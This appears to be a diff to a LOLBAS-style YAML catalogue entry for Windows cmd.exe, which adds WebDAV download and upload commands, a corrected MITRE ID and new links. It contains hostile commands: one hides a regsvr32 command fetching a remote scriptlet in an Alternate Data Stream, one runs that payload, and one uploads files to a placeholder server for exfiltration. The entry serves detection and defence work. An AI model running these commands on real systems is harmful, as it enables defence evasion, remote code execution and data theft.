@@ -1,7 +1,7 @@
 ---
 Name: Cmd.exe
 Description: The command-line interpreter in Windows
-Author: 'Ye Yint Min Thu Htut'
+Author: Ye Yint Min Thu Htut
 Created: 2019-06-26
 Commands:
   - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
@@ -9,7 +9,7 @@ Commands:
     Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
     Category: ADS
     Privileges: User
-    MitreID: T1059.003
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: cmd.exe - < fakefile.doc:payload.bat
     Description: Execute payload.bat stored in an Alternate Data Stream (ADS).
@@ -18,6 +18,20 @@ Commands:
     Privileges: User
     MitreID: T1059.003
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: type \\webdav-server\folder\file.ext > C:\Path\file.ext
+    Description: Downloads a specified file from a WebDAV server to the target file.
+    Usecase: Download/copy a file from a WebDAV server
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: type C:\Path\file.ext > \\webdav-server\folder\file.ext
+    Description: Uploads a specified file to a WebDAV server.
+    Usecase: Upload a file to a WebDAV server
+    Category: Upload
+    Privileges: User
+    MitreID: T1048.003
+    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\cmd.exe
   - Path: C:\Windows\SysWOW64\cmd.exe
@@ -29,6 +43,11 @@ Detection:
   - IOC: cmd.exe creating/modifying file contents in an alternate data stream.
 Resources:
   - Link: https://twitter.com/yeyint_mth/status/1143824979139579904
+  - Link: https://twitter.com/Mr_0rng/status/1601408154780446721
+  - Link: https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22
+  - Link: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type
 Acknowledgement:
   - Person: r0lan
     Handle: '@yeyint_mth'
+  - Person: Mr.0range
+    Handle: '@mr_0rng'
